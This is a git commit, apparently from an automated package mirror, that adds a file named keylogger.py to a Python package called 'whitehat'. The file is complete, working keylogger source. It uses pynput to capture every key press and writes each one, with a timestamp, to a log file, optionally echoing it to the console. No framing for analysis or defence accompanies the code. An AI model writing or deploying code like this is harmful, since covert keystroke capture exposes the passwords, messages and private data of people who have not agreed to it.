d307bd9a07d551169c84f78a9c5e09ec4c9a27ef
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 09:12:01 +0000

    Add package whitehat/1.2.1/whitehat-1.2.1.tar.gz

---
+++ packages/whitehat/whitehat-1.2.1.tar.gz/whitehat-1.2.1/whitehat/keylogger.py
@@ -0,0 +1,37 @@
+from .errors import *
+
+try:
+    from pynput.keyboard import Key, Listener
+except ImportError:
+    raise InstallAdditionalPackages("pynput")
+
+import logging
+
+class Keylogger:
+    r"""A class that implements Keylogger function
+    -----------
+    Classmethod :
+    - start
+    """
+    
+    @classmethod
+    def start(self, logfile_path:str=None, allow_print=False):
+        r"""Start Keylogger
+        -----------
+        Paramaters :
+        - logfile_path: `str` | Log file path (txt)
+        - allow_pint: `True/False` | Allow print at console? (Default: False)
+        """
+        if logfile_path == None:
+            raise CannotNone("logfile_path")
+        
+        print("Ready!")
+        logging.basicConfig(filename=logfile_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+        def on_press(key):
+            logging.info(str(key))
+            if allow_print == True:
+                print(str(key))
+
+        with Listener(on_press=on_press) as listener:
+            listener.join()
